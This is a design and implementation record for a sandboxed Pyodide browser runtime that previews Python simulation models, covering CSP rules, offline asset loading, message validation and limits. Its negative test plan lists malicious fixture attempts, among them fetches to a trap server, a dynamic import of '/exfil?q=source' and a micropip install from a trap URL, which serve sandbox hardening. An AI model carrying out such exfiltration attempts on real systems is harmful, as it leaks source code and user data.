# Browser Preview execution contract

日期：2026-09-15。G0 契约及 G1 本地实现；生产接线、独立站点与历史 Verify 仍待阶段2/4。包字段由 `services/browser-preview/contract.ts` 的负责人定义；本文件拥有执行协议与来源边界。

## 同源模型与输入

固定保存文件：`model/model.py`、`model/run.py`、`model/model-spec.json`、`model/visualization.json`、`app/requirements.lock`。不得生成模型专属 JavaScript。`model.py` 导出 `run(config)`，config **只有** `{parameters, seed}`；结果为 `{model, snapshots}`，snapshot 沿用 `riffology.visual/v0.1` 的 grid / lane 协议。模型不能在 import 时自行执行，旧 spike 的末尾全局调用需移入平台 adapter。

parameters 沿用 Model Spec 的 number/integer/enum/boolean、默认值及范围校验；browser 和 server 都先解析同一保存 Spec 并补齐相同默认值，不允许模型自行 clamp/截断产生另一输入。steps / horizon 在需要时声明为普通参数，不增加顶层 steps。seed 为整数 **0..4294967295**，包括边界值；不得 coerce 字符串、浮点数或溢出值。播放速度、暂停、单步与重播是显示操作，不改 config、不创建云端 Run。

`model/run.py --input /run-input/input.json --output /run-output/result.json` 保留服务端现有外部入口，读入 schemaVersion/runId/parameters/seed 后仅将 parameters/seed 交给同一 `model.py`。服务端独立生成合法 Simulation result 与产物，不接收 browser trace 作为结果。G1C 拥有 wrapper 的结果映射和服务器 profile；G1B 拥有 browser adapter。trace 中 metrics 都是本地未验证显示值。

## 固定 profile 与资产

profileId：`python-stdlib/v1`（Queue，不安装 Mesa）和 `mesa-3.5.1/v1`（Mesa 3.5.1）。runtimeVersion：`pyodide-314.0.6/v1`；adapterVersion：`riffology.model-run/v1`；pythonVersion：`3.14.2`。manifest runtime 同时包含 `visualProtocol: riffology.visual/v0.1`、`limitsSha256` 和 `assetSha256` 和完整依赖闭包的 `{name,version,sha256}`；依赖按 name 排序，全部字段参与包身份。平台 profile 注册表必须逐字段匹配；只满足 schema 不代表可执行。

2026-09-15 实际读取 `https://cdn.jsdelivr.net/pyodide/v314.0.6/full/pyodide-lock.json`：Python 3.14.2；networkx 3.6.1、numpy 2.4.6、pandas 3.0.2、tqdm 4.67.3。networkx 在 distribution lock 中还有 decorator/setuptools/matplotlib/numpy 依赖，必须递归解析，不能只安装 Mesa 或假设五个 wheel 足够。当前 server 只支持空 lock / SimPy 4.1.1，镜像和 Python 执行器都未支持 Mesa；G1C 必须保留旧 profile 并一起修改这些限制。

G1 资产供应：在构建时获取并校验 Pyodide JS/WASM/stdlib zip、distribution lock 和 wheel 闭包；生成固定资产清单及其 canonical SHA256。无真实 digest 的 profile 不能 ready。平台 bootstrap 可安装已核验的本地 wheel，generated Python 不运行 micropip.install 或按模型请求联网。旧 profile / adapter 的固定资产必须保留以解释旧 package。

## 执行消息与资源

可信 UI 验证 manifest 与所有 source bytes，按 packageIdentity 装载。run 消息：`{schema:'riffology.browser-runtime/v1', type:'run', requestId, packageIdentity, input:{parameters,seed}}`。包 bytes 单独装载一次，不允许每次 run 消息任意替换 source。result 消息：`{schema, type:'result', requestId, packageIdentity, trace}`。error 消息仅带同 schema/type/requestId/packageIdentity 和有界 code/text。requestId 与 packageIdentity 均匹配当前 pending 才可显示。新包/取消/超时清 pending 并终止 Worker；每次 run 新 Worker，防止 Python 全局状态和迟到 postMessage 复用。

固定上限对象为 `{inputBytes:8192,resultBytes:8388608,frames:501,agentsPerFrame:10000,gridCells:1000000,deadlineMs:30000,maxSteps:500,cacheBytes:8388608,sourceBytes:1048576,bundleBytes:5242880}`，steps 普通参数最多500（horizon时间范围依Spec，不能等同步数），单 source最多1 MiB、bundle最多5 MiB、播放缓存最多8 MiB；canonical SHA256 对应 limitsSha256 并由 profile 精确匹配。G0 的 `runtime/protocol.mjs` 只验证数据形状及显示限制：输入 8 KiB，trace 8 MiB，501 frames，每 frame 10000 agents，grid 1000000 cells；G1 在 worker JSON 序列化前、host 接收后均检查，并对 stdout/stderr 与播放缓存设限。deadline 30 秒由可信 host 定时器强制 terminate，不能等待 Python 响应 cancel。JS 接收校验不能防止 structured-clone 前内存耗尽，不能宣称硬内存隔离；超限或不可终止执行拒绝继续。

## 无凭据来源和网络边界

推荐冻结独立执行站点（与 app 不共享 registrable domain 和 Cookie 域），静态平台 runtime，不设置认证 cookie、不提供 application API、不托管私有包。可信 app 先通过已有授权 API 取包，再将经过 digest 校验的纯模型文件与固定资产 bytes 交给 sandbox iframe 的 MessageChannel；不交 token/cookie/session/capability/chat/R2 key，不向 iframe 暴露通用 fetch broker。独立链接仍先打开可信 app 授权外壳；它不是公开私有包链接。

iframe 使用 `sandbox='allow-scripts allow-same-origin'`，仅因独立无凭据站点才允许 same-origin，以创建 module Worker；禁止 top-navigation/popups/forms。app 仅与事先捕获的 iframe.contentWindow、精确执行站点 origin 建立一次 channel，后续仅处理私有 port；外部 window message 不能触发 Verify。iframe 自身不读取 app DOM，generated Python 只在 worker 执行。替换 iframe / 包后关 port 与 Worker。

worker **自身 HTTP 响应** CSP：`default-src 'none'; script-src 'unsafe-eval' 'wasm-unsafe-eval'; connect-src 'none'; worker-src 'none'`；G1 实际 Pyodide 动态库初始化需要 JS eval，原因见下文。Worker/Pyodide bootstrap 是构建时内联单 bundle，不运行任何运行时 JS import。删除 worker script-src self 是必要条件：connect-src none 不限制 dynamic import，同来源可带query泄漏源码。frame CSP 同样 connect-src none，仅允许平台 module Worker。不使用 blob Worker 绕开 HTTP CSP。必须为 Pyodide 提供预加载本地资产的离线 loader：WASM 用已核验 bytes instantiate，stdlib / wheel 从 bytes 进入 FS；若库仍需 fetch，则仅内存固定清单的只读 loader，不发送实际 HTTP、不接受动态 URL。修改 JS fetch 本身不构成隔离；浏览器 CSP 是最终网络拒绝边界，真实浏览器必须验证。

根据 [MDN Worker/CSP](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers#content_security_policy)，Worker 可联网且其响应的 CSP 才约束 Worker；[Pyodide Worker](https://pyodide.org/en/stable/usage/webworker.html) 只证明可在后台执行。spike 目前从 CDN 动态 import、安装 micropip/Mesa，且 Worker 使用应用来源，**没有满足本边界**。若离线 loader 与该 CSP 不能实际运行，阻止 ready，不回退到允许任意 CDN/PyPI 网络。

## 历史 Revision Verify

可信 UI 的显式按钮提交 `{revisionId,packageIdentity,parameters,seed,intent:'experiment',idempotencyKey}`，不接收 metrics/trace/客户端存储地址。服务端通过当前项目权限解析冻结 RevisionStore 文件，复算 manifest/source/Spec/dependency 身份，并运行该 Revision 的 model/run.py。撤权、跨项目、digest 不符、旧源已不可用时明确拒绝；禁止静默解析 head 或 restore Pi Session。

单配置默认创建既有单次 Experiment/Run；Evidence 必须另行按既有至少 baseline + intervention 的研究组契约显式运行，不伪造第二配置。重复点击和未知响应刷新沿用同一 idempotencyKey 与冻结输入；冲突输入拒绝。普通 GET、iframe 消息、本地重播与刷新不提交 Run。构建状态、历史解析与幂等提交由 G2A 独占实现。

## 可运行负向验收设计 / G1-G3

新增真实 Playwright 驱动，不 stub Worker、不 route fulfill 伪造 Pyodide；启动两个本地 HTTP server 代表 app/execution，并第三个 trap server 记录连接。真实 production frame/worker 与真实固定 Pyodide bytes必须进入页面。测试命令计划为 `node services/browser-preview/runtime/browser-acceptance.mjs`，程序自行启动端口并选择 CHROMIUM_PATH。代码未交付时不得把该命令写为已通过。

逐个独立 Worker 加载恶意 model fixture：`import js` 后 fetch(app API/trap)、XMLHttpRequest、WebSocket、EventSource、动态 import（包括执行站点自身 `/exfil?q=source`，验证 script-src 也产生零请求）、subworker、`micropip.install('https://trap/...whl')`；断言 trap 与 app 服务端访问日志没有到达请求，CSP violation / 明确拒绝记录与实际输出相符。不禁止 import js 来掩盖测试。还要从 frame 尝试读取 parent DOM/cookies；外部 frame 向 host 伪造结果与 Verify 消息；读取另一项目包；篡改 manifest/source；旧 requestId/packageIdentity；输出超限；无限循环超时；运行期间取消。检查 timeout/cancel 后下一有效 Queue/Mesa run 仍能成功且旧 trace 不显示。

正向真实 Mesa grid / stdlib Queue lane 都通过同一 runtime/renderer，seed 两边界和 steps 普通参数，browser 与 server 重跑 snapshot/metrics 可对照；所有网络按 server log 与 browser request日志双核对。运行窗口不得新增 LLM/Simulation/Project execution；显式 Verify 单独窗口计数并忽略 browser伪造指标。保存 JSON trace、CSP/请求日志、server trap counters 和 screenshots，计算 SHA256SUMS。两端口仅是本地开发可运行拓扑，线上独立站点配置仍需单独证据。

G0 本地 fixture 检查：`node services/browser-preview/runtime/protocol.test.mjs`。它覆盖输入、grid/lane、错包/迟到结果及有界显示数据；不证明真实 Python 执行、权限读取、HTTP CSP、离线供给或 server Verify。真实本地执行及未覆盖项见以下 G1 记录。

## G1 implementation and handoff

The implemented host validates canonical package bytes, strict base64 roundtrip, every source hash/length, the saved Model Spec, visualization keys, source lock and the exact fixed profile in `runtime/assets/profiles.json`. Both host and Worker resolve identical Spec defaults/ranges. A new load cancels the old pending execution immediately, captures input bytes and uses a generation check after every await; a failed load retains the previous validated package. Channel handshake and started events are accepted once. Results/errors must match the pending request and package; diagnostics and errors have bounded lengths/counts.

Verified Pyodide 314.0.6 source supports `createPyodideModule` for statically bundled asm code and `lockFileContents` to avoid lock HTTP. `stdLibURL` and wasm instantiation still use fetch. Bootstrap therefore supplies only exact preverified in-memory asset Responses, with no network fallback, and explicitly sets `packageBaseUrl`/`indexURL` to that inventory. All fixed distribution wheels and the local Mesa wheel are installed before native fetch is restored. The Worker response CSP then rejects generated Python's network access.

The real asm.mjs has six eval sites, including `registerDylibSymbols` compiling fixed EM_ASM/EM_JS functions with `eval(func)`. Its minimal working CSP adds `unsafe-eval` alongside `wasm-unsafe-eval` while keeping **no self/https/data/blob script URL sources**. This allows JS eval but rejects URL dynamic import, including the execution site's own `/exfil?q=source`. The actual Chrome violation directive for these imports is `script-src-elem`. Generated `import js` is deliberately executed by the negative tests.

Bundle identity avoids a hash cycle: Worker/frame do not embed the profile registry. Preparation builds their exact bytes first, adds both bundle hashes to the profile asset manifest, then builds the host containing the trusted profiles. The host passes its verified profile through the private channel; the Worker rechecks package/assets and its own URL digest. URLs are `/runtime/<worker-bundle-sha>/worker.bundle.mjs` and `/runtime/<frame-bundle-sha>/frame.html`, with the latter loading frame.bundle at the same digest path. Preparation writes immutable `.local/browser-preview/delivery/<sha>/` files using create-only semantics and retains old bundles. The identity also covers every runtime module, bundled contract.ts/model-spec.ts, package-lock and preparation script. The lock freezes the compiler, while the actual bundle hashes bind final execution bytes. `assets/delivery.json` separately records the host bundle hash/length, profile hashes, exact esbuild version and build options. Production must retain old registries/assets/delivery versions; this local implementation is not deployment evidence.

The upstream assets total 47,279,010 bytes. Queue uses only core JS/WASM/stdlib/lock, with no Mesa install. Mesa uses 20 fixed dependencies: 18 distribution packages in the recursive closure, micropip for an actual arbitrary-install denial test, and Mesa itself. The source lock remains the agreed six packages. Official Mesa 3.5.1 metadata requires Python >=3.12; browser Python is 3.14.2. Server Queue preserves its historical 3.11.14 profile and Mesa uses a separate 3.14.2 profile; see the server author's record for server evidence. The two model fixture files were handed to that author for same-source checks. The positive `model/run.py` fixture is the actual canonical server adapter, SHA256 `b0c785d8c08838d9e416eb87aba1c6b5ce9d8b1d6d233cf2fec32de99a0ec7f5`.

The renderer draws grid agents onto one fixed 600 x 420 Canvas instead of allocating one DOM node per cell; lanes are grouped once before sorting. A valid million-cell grid with 10,000 agents is included in browser acceptance. Playback only paints cached frames. Dispose cancels execution, invalidates pending loads and releases package/asset references. These limits do not provide a hard process memory boundary.

Prepare with `npm ci` and `node services/browser-preview/runtime/prepare-assets.mjs`. Downloaded upstream URL/hash/length are pinned; changes are rejected. Runtime source changes invalidate the manifest and require an explicitly reviewed `--update-manifest` for this candidate. Assets/bundles remain in ignored `.local`; only metadata and reproducible preparation are committed. `node --test services/browser-preview/runtime/*.test.mjs` is the ordinary fixture/schema suite. `node services/browser-preview/runtime/browser-acceptance.mjs` separately executes actual Chrome/module Worker/Pyodide, with CHROMIUM_PATH and OUTPUT_DIR overrides. Missing assets fail; they are never replaced by mocked successful Python output.

The initial missing-packageBaseUrl failure selected a CDN URL and was rejected by the offline loader; its full stack is in this task's tool output, but its raw files were not archived before the next run. The misleadingly named `.local/browser-preview/first-mesa-failure/` actually contains the later grid-shape failure, as does `mesa-grid-shape-failure/` (spike's extra torus failed the strict grid protocol). The CSP diagnostic assertion failure is separately retained under `csp-directive-assertion-failure/` (the assertion expected script-src while Chrome emitted script-src-elem). These were diagnosed before corrective runs. Final candidate evidence and SHA256SUMS are under `.local/browser-preview/acceptance/`.

Normal preparation also compares the entire committed `assets/delivery.json` receipt with the actual new host bundle, compiler/version/options and profile hashes before writing the local delivery receipt. A targeted real build check changed the committed host SHA to zeros and observed `runtime-delivery-mismatch`; restoring the original receipt allowed normal preparation. The loader additionally rejects a noncanonical server adapter even when the sender recomputes a valid package identity. Negative sandbox fixtures retain the genuine adapter and only replace generated model.py; there is no production bypass flag.

Final G1 local candidate: **26 real browser cases passed**, plus **5 ordinary fixture/schema tests passed** (separate counts). Real cases include both model families, deterministic replay/changed seed and parameters, uint32 boundary seeds in both models, playback, direct malicious Python network/JS/import/micropip/subworker attempts, frame parent DOM/cookie denial, immutable runtime delivery, source tampering, input errors, forged connected/window messages, cancellation and timeout followed by a valid run, Python output limits, load-generation races and a legal million-cell Canvas. Trap/app API arrivals and execution cookies were zero. CSP diagnostics explicitly recorded connect-src, script-src-elem and worker-src denials. This signs off the tested local topology only; the following production and integration gaps remain open.

Still uncovered: saved/checkpoint automatic builds, production authorized R2/API reads, cross-project/revocation/history Verify, deployed independent site/Cookie configuration, cloud inventory/ledger counting, agent automatic compatibility builds and publication/copy. Malicious model fixtures are deliberately sent directly to the sandbox by the driver; they do not pass the compatibility validator and cannot justify ready/publication. Local app uses localhost while execution/trap use 127.0.0.1, proving only that tested topology's requests carry no app cookie. For non-local origins the constructor requires HTTPS and conservatively rejects a shared final two hostname labels. This is a fail-closed guard against mistakes, not a full public-suffix or cookie-domain proof; G2/G4 must use an audited dedicated site configuration. Independent authenticated links remain a G2 product task.
